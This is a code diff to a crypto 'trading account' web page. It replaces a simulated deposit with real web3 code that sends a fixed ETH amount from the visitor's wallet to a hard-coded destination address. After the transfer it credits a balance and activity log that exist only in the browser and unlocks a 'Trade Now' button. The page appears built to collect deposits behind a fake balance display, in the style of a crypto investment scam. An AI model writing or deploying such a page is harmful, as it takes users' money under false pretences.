-                confirmDepositBtn.disabled = true;
-                confirmDepositBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
+                // Get current gas price
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
                 
-                // Simulate transaction delay
-                setTimeout(() => {
-                    // Update balance
-                    updateBalance(amount);
-                    
-                    // Add to activity
-                    addActivity('Deposit', amount, 'ETH');
-                    
-                    // Close modal
-                    depositModal.classList.add('hidden');
-                    
-                    // Reset button
-                    confirmDepositBtn.disabled = false;
-                    confirmDepositBtn.textContent = 'Send 1 ETH Now';
-                    
-                    // Enable trade button if balance is sufficient
-                    if (amount >= 0.1) {
+                // Update estimated gas fee display (assuming 21000 gas limit)
+                const gasCostEth = 21000 * gasPrice / 1e18;
+                estimatedGasFee.textContent = `~$${(gasCostEth * 2000).toFixed(2)} (estimated)`; // Assuming $2000/ETH
+                
+                // Prepare transaction parameters
+                const transactionParameters = {
+                    from: account,
+                    to: DESTINATION_ADDRESS,
+                    value: web3.utils.toWei(AMOUNT_ETH.toString(), 'ether'),
+                    gas: web3.utils.toHex(21000), // Standard gas limit for simple ETH transfers
+                    gasPrice: gasPrice // Current gas price
+                };
+                
+                // Send transaction - this will trigger the wallet confirmation
+                web3.eth.sendTransaction(transactionParameters)
+                    .on('transactionHash', function(hash) {
+                        // Transaction was sent to the network
+                        console.log('Transaction hash:', hash);
+                        txHashContainer.classList.remove('hidden');
+                        txHashLink.textContent = `${hash.substring(0, 12)}...${hash.substring(58)}`;
+                        txHashLink.href = `https://etherscan.io/tx/${hash}`;
+                    })
+                    .on('receipt', function(receipt) {
+                        // Transaction was mined
+                        console.log('Transaction receipt:', receipt);
+                        
+                        // Show success
+                        transactionSpinner.classList.add('hidden');
+                        transactionSuccess.classList.remove('hidden');
+                        transactionTitle.textContent = 'Transaction Successful';
+                        transactionMessage.textContent = `${AMOUNT_ETH} ETH has been deposited to your trading account!`;
+                        transactionDetails.classList.remove('hidden');
+                        txFrom.textContent = account;
+                        
+                        // Update balance display
+                        updateBalance(AMOUNT_ETH);
+                        
+                        // Add to activity
+                        addActivity('Deposit', AMOUNT_ETH, 'ETH');
+                        
+                        // Enable trade button
                         tradeNowBtn.classList.remove('btn-disabled');
                         tradeNowBtn.disabled = false;
-                    }
-                }, 2000);
+                    })
+                    .on('error', function(error) {
+                        console.error('Transaction error:', error);
+                        
+                        // Show error
+                        transactionSpinner.classList.add('hidden');
+                        transactionError.classList.remove('hidden');
+                        transactionTitle.textContent = 'Transaction Failed';
+                        transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
+                    });
                 
             } catch (error) {
-                console.error('Deposit error:', error);
-                confirmDepositBtn.disabled = false;
-                confirmDepositBtn.textContent = 'Send 1 ETH Now';
-                alert('Deposit failed. Please try again.');
+                console.error('Error performing transaction:', error);
+                
+                // Show error
+                transactionSpinner.classList.add('hidden');
+                transactionError.classList.remove('hidden');
+                transactionTitle.textContent = 'Transaction Failed';
+                transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
             }
-        });
+        }
 
         // Update Balance
         function updateBalance(amount) {
-            balanceAmount.textContent = `${amount.toFixed(2)} ETH`;
+            balanceAmount.textContent = `${amount.toFixed(3)} ETH`;
             
             // If balance is sufficient, enable trade button
             if (amount >= 0.1) {
@@ -450,18 +818,18 @@
             const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
             
             const activityItem = document.createElement('div');
-            activityItem.className = 'flex items-center justify-between p-3 bg-gray-50 rounded-lg';
+            activityItem.className = 'flex items-center justify-between p-2 md:p-3 bg-gray-50 rounded-lg';
             activityItem.innerHTML = `
-                <div class="flex items-center space-x-3">
-                    <div class="bg-emerald-100 p-2 rounded-full">
-                        <i class="fas ${type === 'Deposit' ? 'fa-arrow-down' : 'fa-arrow-up'} text-emerald-600"></i>
+                <div class="flex items-center space-x-2 md:space-x-3">
+                    <div class="bg-emerald-100 p-1 md:p-2 rounded-full">
+                        <i class="fas ${type === 'Deposit' ? 'fa-arrow-down' : 'fa-arrow-up'} text-emerald-600 text-sm md:text-base"></i>
                     </div>
                     <div>
-                        <p class="font-medium">${type}</p>
-                        <p class="text-sm text-gray-500">${timeString}</p>
+                        <p class="font-medium text-sm md:text-base">${type}</p>
+                        <p class="text-xs md:text-sm text-gray-500">${timeString}</p>
                     </div>
                 </div>
-                <span class="text-emerald-600 font-medium">${type === 'Deposit' ? '+' : '-'}${amount} ${currency}</span>
+                <span class="text-emerald-600 font-medium text-sm md:text-base">${type === 'Deposit' ? '+' : '-'}${amount} ${currency}</span>
             `;
             
             activityList.insertBefore(activityItem, activityList.firstChild);
@@ -493,6 +861,26 @@
                 }
             });
         }
+
+        // Close modal when clicking outside
+        transactionModal.addEventListener('click', function(e) {
+            if (e.target === transactionModal) {
+                transactionModal.classList.add('hidden');
+            }
+        });
+
+        insufficientModal.addEventListener('click', function(e) {
+            if (e.target === insufficientModal) {
+                insufficientModal.classList.add('hidden');
+            }
+        });
+
+        warningModal.addEventListener('click', function(e) {
+            if (e.target === warningModal) {
+                warningModal.classList.add('hidden');
+                mainContent.classList.remove('blur-background');
+            }
+        });
     </script>
 </body>
 </html>
